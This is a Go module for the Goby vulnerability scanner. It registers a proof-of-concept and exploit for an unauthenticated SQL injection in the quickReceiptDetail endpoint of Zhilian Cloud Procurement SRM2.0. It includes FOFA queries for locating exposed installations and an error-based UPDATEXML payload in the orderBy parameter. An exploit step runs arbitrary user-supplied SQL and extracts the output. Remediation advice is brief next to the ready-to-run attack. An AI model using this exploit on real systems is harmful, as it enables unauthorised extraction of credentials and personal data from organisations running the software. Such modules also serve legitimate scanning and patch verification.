package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Zhilian Cloud Procurement SRM2.0 /adpweb/api/srm/delivery/quickReceiptDetail SQL Injection Vulnerability",
    "Description": "<p>Multiple interfaces (such as quickReceiptDetail, statusList, receiptDetail, inquiry/getSuppliers) in Zhilian Cloud Procurement SRM2.0 are vulnerable to SQL injection. An unauthenticated remote attacker can exploit this vulnerability to obtain sensitive information from the database, such as admin backend passwords and user personal information. In high privilege scenarios, attackers can even write trojans to the server to further gain system permissions.</p>",
    "Product": "Zhilian Cloud Procurement SRM2.0",
    "Homepage": "https://www.zhilink.com/products.html",
    "DisclosureDate": "2024-11-22",
    "PostTime": "2024-11-23",
    "Author": "secure_insights@163.com",
    "FofaQuery": "(body=\"function changeTableMode()\" || title==\"SRM 2.0\") && header=\"Content-Type: text/html\"",
    "GobyQuery": "(body=\"function changeTableMode()\" || title==\"SRM 2.0\") && header=\"Content-Type: text/html\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection, and even execute arbitrary code under high privileges, potentially leading to data leakage and system control.</p>",
    "Recommendation": "<p>It is recommended to strictly use parameterized queries and input validation for all inputs to prevent SQL injection attacks. Additionally, update and patch system vulnerabilities in a timely manner, and restrict database user permissions to prevent unauthorized access.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/143933156"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "select database(),select version(),select user()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/adpweb/api/srm/delivery/quickReceiptDetail?orderBy=%28UPDATEXML%288058%2CCONCAT%280x2e%2C0x7e%2C%28select+database%28%29%29%2C0x7e%29%2C3521%29%29",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/adpweb/api/srm/delivery/quickReceiptDetail?orderBy=%28UPDATEXML%288058%2CCONCAT%280x2e%2C0x7e%2C%28{{{payload_encode}}}%29%2C0x7e%29%2C3521%29%29",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~([\\s\\S]*?)~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "智联云采 SRM2.0 /adpweb/api/srm/delivery/quickReceiptDetail SQL 注入漏洞",
            "Product": "智联云采 SRM2.0",
            "Description": "<p>智联云采 SRM2.0的/adpweb/api/srm/delivery/quickReceiptDetail 接口存在SQL注入漏洞。未经身份验证的远程攻击者可以利用此漏洞获取数据库中的敏感信息，如管理员后台密码和用户个人信息。在高权限情况下，攻击者甚至可以向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>建议对所有输入进行严格的参数化查询和输入验证，避免SQL注入攻击。同时，及时更新和修补系统漏洞，限制数据库用户权限，防止未授权访问。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入获取数据库中的敏感信息，甚至在高权限下执行任意代码，可能导致数据泄露、系统被控制等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Zhilian Cloud Procurement SRM2.0 /adpweb/api/srm/delivery/quickReceiptDetail SQL Injection Vulnerability",
            "Product": "Zhilian Cloud Procurement SRM2.0",
            "Description": "<p>Multiple interfaces (such as quickReceiptDetail, statusList, receiptDetail, inquiry/getSuppliers) in Zhilian Cloud Procurement SRM2.0 are vulnerable to SQL injection. An unauthenticated remote attacker can exploit this vulnerability to obtain sensitive information from the database, such as admin backend passwords and user personal information. In high privilege scenarios, attackers can even write trojans to the server to further gain system permissions.</p>",
            "Recommendation": "<p>It is recommended to strictly use parameterized queries and input validation for all inputs to prevent SQL injection attacks. Additionally, update and patch system vulnerabilities in a timely manner, and restrict database user permissions to prevent unauthorized access.</p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection, and even execute arbitrary code under high privileges, potentially leading to data leakage and system control.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}"
    },
    "PocId": "9974"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}